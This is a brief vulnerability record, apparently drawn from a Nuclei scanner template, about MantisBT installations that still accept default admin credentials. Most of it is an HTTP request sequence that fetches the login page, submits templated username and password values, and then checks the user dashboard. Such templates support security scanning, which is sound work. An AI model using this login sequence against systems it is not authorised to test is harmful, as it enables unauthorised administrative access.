# Vulnerability: MantisBT Default Admin Login
**Classification:** CWE-522
**Source:** Nuclei Template (`mantisbt-default-credential.yaml`)

## Description
A MantisBT default admin login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login_password_page.php HTTP/1.1
Host: {{Hostname}}

POST /login_password_page.php HTTP/1.1
Host: {{Hostname}}
Cookie: MANTIS_secure_session=1; PHPSESSID={{session}}
Content-Type: application/x-www-form-urlencoded

return=index.php&username={{username}}

POST /login_password_page.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: MANTIS_secure_session=1; PHPSESSID={{session}}

return=index.php&username={{username}}&password={{password}}&secure_session=on

GET /my_view_page.php HTTP/1.1
Host: {{Hostname}}
```

